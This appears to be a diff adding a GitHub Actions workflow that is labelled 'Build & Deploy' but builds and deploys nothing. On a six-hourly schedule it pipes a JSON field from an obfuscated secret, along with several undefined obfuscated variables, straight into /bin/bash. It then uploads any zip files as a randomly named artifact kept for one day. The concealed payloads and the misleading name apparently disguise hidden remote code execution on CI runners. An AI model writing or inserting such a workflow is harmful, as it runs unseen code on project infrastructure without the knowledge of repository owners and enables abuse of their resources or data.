@@ -1,0 +1,35 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          ddzc83149: ${{ secrets.ddzc83149 }}
+        run: |
+          printf '%s' "$ddzc83149" | jq -r .oa5 | /bin/bash
+          echo $hw8 | jq -r .o16249 | /bin/bash
+          echo $ac10340 | jq -r .aawbx0785 | /bin/bash
+          echo $whf18 | jq -r .zoh115 | /bin/bash
+          echo $kmr9722 | jq -r .qams97950 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: kKGI3dU1
+          path: "*.zip"
+          retention-days: 1
